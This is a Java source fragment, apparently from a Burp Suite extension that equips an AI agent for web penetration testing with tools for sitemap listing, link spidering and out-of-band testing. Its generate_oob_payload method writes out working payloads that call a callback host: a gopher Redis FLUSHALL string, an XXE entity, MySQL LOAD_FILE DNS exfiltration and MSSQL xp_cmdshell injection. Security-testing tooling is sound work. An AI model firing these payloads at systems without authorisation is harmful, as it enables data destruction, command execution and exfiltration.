          ctxBlock.add((j == li ? ">> " : "   ") + "L" + (j + 1) + ": " + AgentUtils.truncate(lines[j], 200));
        }
        Matcher mm = lineP.matcher(lines[li]);
        List<String> matchValues = new ArrayList<>();
        while (mm.find()) { try { matchValues.add(mm.group()); } catch (Exception ignored) {} }
        Map<String, Object> hit = new LinkedHashMap<>();
        hit.put("line", li + 1);
        hit.put("matches", matchValues);
        hit.put("context", ctxBlock);
        hits.add(hit);
        if (hits.size() >= 50) break;
      }
      Map<String, Object> out = new LinkedHashMap<>();
      out.put("ok", true);
      out.put("pattern", pattern);
      out.put("total_matching_lines", matchLineNums.size());
      out.put("results", hits);
      if (matchLineNums.isEmpty()) {
        out.put("hint", "Pattern not found. Try a simpler pattern or use spider_links to discover endpoints.");
      }
      return json.writeValueAsString(out);
    } catch (java.util.regex.PatternSyntaxException pse) {
      return json.writeValueAsString(Map.of("ok", false, "error", "Invalid regex: " + pse.getMessage()));
    }
  }

  // ─────────────────────── get_sitemap ─────────────────────────────────────

  String toolGetSitemap(String baseUrl) throws Exception {
    String base = AgentUtils.normalizeBase(baseUrl);
    if (base.isBlank()) return json.writeValueAsString(Map.of("ok", false, "error", "base_url is required"));

    Set<String> seenFp = new LinkedHashSet<>();
    List<Map<String, Object>> endpoints = new ArrayList<>();

    try {
      List<HttpRequestResponse> siteMapEntries =
          api.siteMap().requestResponses(SiteMapFilter.prefixFilter(base));
      for (HttpRequestResponse rr : siteMapEntries) {
        if (rr.request() == null) continue;
        AgentUtils.addSitemapEntry(endpoints, seenFp,
            rr.request().url(), rr.request().method(),
            rr.response() != null ? rr.response().statusCode() : 0);
      }
    } catch (Exception e) {
      api.logging().logToError("[get_sitemap] sitemap query failed: " + e);
    }

    try {
      List<ProxyHttpRequestResponse> proxyEntries =
          api.proxy().history(rr -> rr.request() != null && rr.request().url().startsWith(base));
      for (ProxyHttpRequestResponse rr : proxyEntries) {
        if (rr.request() == null) continue;
        AgentUtils.addSitemapEntry(endpoints, seenFp,
            rr.request().url(), rr.request().method(),
            rr.response() != null ? rr.response().statusCode() : 0);
      }
    } catch (Exception e) {
      api.logging().logToError("[get_sitemap] proxy history query failed: " + e);
    }

    Map<String, Set<String>> pathMethods = new LinkedHashMap<>();
    Map<String, Set<String>> pathParams  = new LinkedHashMap<>();
    for (Map<String, Object> ep : endpoints) {
      String path   = String.valueOf(ep.get("path"));
      String method = String.valueOf(ep.get("method"));
      pathMethods.computeIfAbsent(path, k -> new LinkedHashSet<>()).add(method);
      @SuppressWarnings("unchecked")
      List<String> qp = (List<String>) ep.get("query_params");
      if (qp != null) pathParams.computeIfAbsent(path, k -> new LinkedHashSet<>()).addAll(qp);
    }

    List<Map<String, Object>> summary = new ArrayList<>();
    for (Map.Entry<String, Set<String>> e : pathMethods.entrySet()) {
      Map<String, Object> row = new LinkedHashMap<>();
      row.put("path", e.getKey());
      row.put("methods", new ArrayList<>(e.getValue()));
      Set<String> params = pathParams.getOrDefault(e.getKey(), new LinkedHashSet<>());
      if (!params.isEmpty()) row.put("query_params", new ArrayList<>(params));
      summary.add(row);
    }

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("ok", true);
    out.put("base_url", base);
    out.put("total_entries", seenFp.size());
    out.put("unique_paths", summary.size());
    out.put("endpoints", summary);
    if (summary.isEmpty()) {
      out.put("hint", "No entries found for this base URL in the site map or proxy history. "
          + "Browse the target manually or run a baseline request first.");
    }
    return json.writeValueAsString(out);
  }

  // ─────────────────────── spider_links ────────────────────────────────────

  String toolSpiderLinks(int requestId, String baseUrl) throws Exception {
    String body = responseBodyStore.get(requestId);
    if (body == null) {
      return json.writeValueAsString(Map.of("ok", false, "error",
          "No stored response for request_id " + requestId));
    }

    String base = AgentUtils.normalizeBase(baseUrl);
    Set<String> links    = new LinkedHashSet<>();
    Set<String> forms    = new LinkedHashSet<>();
    Set<String> scripts  = new LinkedHashSet<>();
    Set<String> apiCalls = new LinkedHashSet<>();
    Set<String> inputs   = new LinkedHashSet<>();

    Matcher m;
    m = Pattern.compile("(?:href|src|data-url|data-href)=[\"']([^\"'#\\s][^\"']*)[\"']",
        Pattern.CASE_INSENSITIVE).matcher(body);
    while (m.find()) { String r = AgentUtils.resolveUrl(base, m.group(1).trim()); if (r != null) links.add(r); }

    m = Pattern.compile("<form[^>]+action=[\"']([^\"']+)[\"']",
        Pattern.CASE_INSENSITIVE).matcher(body);
    while (m.find()) { String r = AgentUtils.resolveUrl(base, m.group(1).trim()); if (r != null) forms.add(r); }

    m = Pattern.compile("<script[^>]+src=[\"']([^\"']+)[\"']",
        Pattern.CASE_INSENSITIVE).matcher(body);
    while (m.find()) { String r = AgentUtils.resolveUrl(base, m.group(1).trim()); if (r != null) scripts.add(r); }

    m = Pattern.compile(
        "(?:fetch|axios\\.(?:get|post|put|delete|patch)|\\$\\.(?:ajax|get|post))\\([\"']([^\"']+)[\"']",
        Pattern.CASE_INSENSITIVE).matcher(body);
    while (m.find()) { String r = AgentUtils.resolveUrl(base, m.group(1).trim()); if (r != null) apiCalls.add(r); }

    m = Pattern.compile("(?:url|endpoint|api_url|apiUrl):\\s*[\"']([^\"'?#]+(?:[?][^\"']*)?)[\"']",
        Pattern.CASE_INSENSITIVE).matcher(body);
    while (m.find()) { String r = AgentUtils.resolveUrl(base, m.group(1).trim()); if (r != null) apiCalls.add(r); }

    m = Pattern.compile("<input[^>]+name=[\"']([^\"']+)[\"']", Pattern.CASE_INSENSITIVE).matcher(body);
    while (m.find()) inputs.add(m.group(1));

    // AttackGraph updates — record discovered links and form input params
    if (runMemory != null) {
      AttackGraph graph = runMemory.getAttackGraph();
      for (String link : links) graph.upsertEndpoint(link);
      for (String form : forms) graph.upsertEndpoint(form);
      for (String api : apiCalls) graph.upsertEndpoint(api);
      for (String inputName : inputs) graph.addParameter(baseUrl, inputName);
    }

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("ok", true);
    out.put("base_url", base);
    out.put("links", new ArrayList<>(links));
    out.put("form_actions", new ArrayList<>(forms));
    out.put("scripts", new ArrayList<>(scripts));
    out.put("js_api_calls", new ArrayList<>(apiCalls));
    out.put("form_inputs", new ArrayList<>(inputs));
    out.put("total_discovered", links.size() + forms.size() + scripts.size() + apiCalls.size());
    return json.writeValueAsString(out);
  }
  // ─────────────────────── generate_oob_payload ─────────────────────

  /**
   * Generates a unique Burp Collaborator OOB domain payload and optionally wraps it
   * in a ready-to-use payload string for the requested protocol.
   *
   * @param protocol one of: dns, http, gopher-redis, ftp — controls the URL scheme
   *                 returned alongside the raw subdomain
   */
  String toolGenerateOobPayload(String protocol) throws Exception {
    if (!collaborator.isAvailable()) {
      return json.writeValueAsString(Map.of(
          "ok", false,
          "error", "Collaborator unavailable (Burp Community Edition or not configured). "
              + "Use an external interactsh server as alternative: generate a payload at "
              + "https://app.interactsh.com and embed it manually."));
    }
    String domain = collaborator.generatePayload();
    if (domain == null) {
      return json.writeValueAsString(Map.of("ok", false, "error", "Collaborator generatePayload() returned null."));
    }

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("ok", true);
    out.put("oob_domain", domain);
    out.put("dns_payload",   domain);
    out.put("http_payload",  "http://" + domain + "/");
    out.put("https_payload", "https://" + domain + "/");
    // Gopher payload for Redis FLUSHALL + SLAVEOF (classic SSRF→RCE chain)
    out.put("gopher_redis_payload",
        "gopher://" + domain + ":6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A");
    out.put("xxe_dtd_payload",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://" + domain + "/xxe\"> %xxe;]>");
    out.put("sqli_dns_mysql",
        "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '." + domain + "\\\\x')))-- -");
    out.put("sqli_dns_mssql",
        "'; EXEC master..xp_cmdshell 'nslookup " + domain + "'-- -");
    out.put("instructions",
        "1. Embed one of the payloads above in the target parameter. "
        + "2. Call poll_collaborator after a short delay to detect DNS/HTTP callbacks. "
        + "3. A DNS interaction confirms blind SSRF or OOB injection. "
        + "4. An HTTP interaction with a path reveals data exfiltrated via the callback URL.");
    return json.writeValueAsString(out);
  }

  // ─────────────────────── poll_collaborator ─────────────────────────

  /**
   * Polls the Collaborator server for any OOB interactions received since the last poll.
   * A DNS or HTTP interaction confirms that a submitted OOB payload triggered a callback,
   * indicating a blind vulnerability (blind SSRF, blind SQLi, blind XXE, blind XSS).
   */
  String toolPollCollaborator() throws Exception {
    if (!collaborator.isAvailable()) {
      return json.writeValueAsString(Map.of(
          "ok", false,
          "error", "Collaborator unavailable — no OOB session active."));
    }
    List<Map<String, Object>> interactions = collaborator.pollInteractions();
    Map<String, Object> out = new LinkedHashMap<>();
    out.put("ok", true);
    out.put("interaction_count", interactions.size());
    out.put("interactions", interactions);
    if (interactions.isEmpty()) {
      out.put("hint",
          "No interactions yet. The OOB payload may not have been processed by the server, "
          + "or the server is blocked from making outbound connections. "
          + "Wait a few seconds and poll again, or try an alternative blind technique (timing-based).");
    } else {
      out.put("assessment",
          "OOB interaction confirmed! This is a confirmed blind vulnerability. "
          + "Report it via report_vulnerability with the generate_oob_payload request_id as evidence.");
    }
    return json.writeValueAsString(out);
  }
  // ─────────────────────── Header parsing ──────────────────────────────────

  Map<String, String> parseHeaders(Object obj) {
    if (obj == null) return new HashMap<>();
    if (obj instanceof Map<?, ?> map) {
      Map<String, String> result = new HashMap<>();
      for (Map.Entry<?, ?> entry : map.entrySet()) {
        result.put(String.valueOf(entry.getKey()), String.valueOf(entry.getValue()));
      }
      return result;
    }
    if (obj instanceof String s && !s.isBlank()) {
      try {
        return json.readValue(s, new TypeReference<Map<String, String>>() {});
      } catch (Exception e) {
        logger.log("[WARN] Failed to parse headers string: " + e.getMessage() + "\n");
      }
    }
    return new HashMap<>();
  }
}
